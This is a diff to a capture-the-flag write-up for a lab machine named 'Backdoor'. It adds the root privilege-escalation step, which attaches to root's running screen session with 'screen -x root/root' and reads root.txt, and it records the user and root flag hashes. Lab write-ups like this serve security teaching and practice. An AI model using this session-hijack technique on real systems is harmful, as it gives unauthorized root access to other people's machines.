@@ -1,3 +1,4 @@
+# Backdoor
 
 1. Nmap reveals port 80 and 22
 
@@ -147,11 +148,16 @@ b43f7cb5891eae348070ac16b82a3a6a
 
 7. Privilege escalation
 ````
+user@Backdoor:/home/user$ export TERM='vt100'
+user@Backdoor:/home/user$ screen -x root/root
+root@Backdoor:~# cat root.txt
+cat root.txt
+c8d447a5ab07e554a8aa14e86becd194
 
 ````
-
-
+screen -x 
+* Attach to a not detached screen session. (Multi display mode). 
 
 # Secrets
 * FLAG_USER = b43f7cb5891eae348070ac16b82a3a6a
-
+* FLAG_ROOT = c8d447a5ab07e554a8aa14e86becd194
